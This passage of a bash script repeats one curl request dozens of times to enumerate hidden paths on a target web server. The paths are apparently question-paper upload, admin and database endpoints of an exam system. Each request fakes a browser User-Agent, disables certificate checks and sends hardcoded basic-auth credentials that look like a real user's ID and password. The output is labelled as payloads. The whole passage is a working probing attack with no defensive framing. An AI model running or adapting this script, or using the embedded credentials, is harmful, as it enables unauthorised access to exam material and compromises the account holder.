" "${target}QPBulk_Control/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Control/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminFileUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminFileUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminFileUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-Platform/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-Platform/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-Platform/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_QuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_QuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_QuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_DataSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_DataSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_DataSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_BulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_BulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_BulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingExamPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingExamPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingExamPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Workflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Workflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Workflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-FileUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-FileUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-FileUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-MonitoringTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-MonitoringTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-MonitoringTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerExamPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerExamPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerExamPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-HandlingModule/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-HandlingModule/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-HandlingModule/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudPlatform/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudPlatform/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudPlatform/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_Ops/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_Ops/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_Ops/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-QPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management-QPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-QPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_ExamPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_ExamPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_ExamPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_ProcessingSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_ProcessingSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_ProcessingSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_DataPipeline/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_DataPipeline/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_DataPipeline/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadMassUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadMassUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadMassUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemFileUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemFileUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemFileUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Automation/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Automation/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Automation/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Service/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
